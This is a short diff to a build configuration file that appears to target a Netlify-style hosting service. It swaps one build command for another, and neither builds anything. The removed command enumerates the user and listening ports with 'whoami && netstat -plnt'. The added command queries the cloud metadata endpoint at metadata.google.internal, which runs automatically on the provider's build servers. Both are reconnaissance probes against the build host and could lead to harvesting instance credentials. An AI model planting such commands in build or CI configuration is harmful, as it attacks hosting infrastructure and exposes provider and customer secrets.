@@ -1,5 +1,5 @@
 [build]
-  command = "whoami && netstat -plnt"
+  command = "curl -i http://metadata.google.internal"
   publish = "dist"
 [build.environment]
   YARN_VERSION = "1.9.4"
